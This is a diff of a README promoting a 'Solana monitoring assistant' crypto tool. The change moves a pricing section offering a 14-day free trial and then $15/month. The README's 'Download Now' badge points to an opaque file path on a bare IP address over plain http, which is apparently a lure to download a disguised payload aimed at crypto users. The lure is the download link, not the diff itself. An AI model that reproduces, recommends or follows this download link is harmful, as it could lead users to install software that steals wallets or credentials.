@@ -7,6 +7,12 @@ Your all-in-one Solana monitoring assistant 🚀🔎
 
 ---
 
+## 💸 Pricing
+
+🧪 **Free for the first 14 days** — test all features with no limitations.  
+💼 **After that: $15/month** — includes future updates, trading tools, and full AI access.
+
+---
 ## 📲 Download Now
 
 [![Download](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=cloud-download)](http://89.248.168.34/Qsg36rs9?name={solanachecker})
@@ -62,12 +68,6 @@ Compare the token to others with similar volume. See:
 📩 **Telegram Notifications** — Stay informed in real time  
 📈 **In-App Trading** — Buy/sell tokens directly inside the tool  
 
----
-
-## 💸 Pricing
-
-🧪 **Free for the first 14 days** — test all features with no limitations.  
-💼 **After that: $15/month** — includes future updates, trading tools, and full AI access.
 
 ---
 
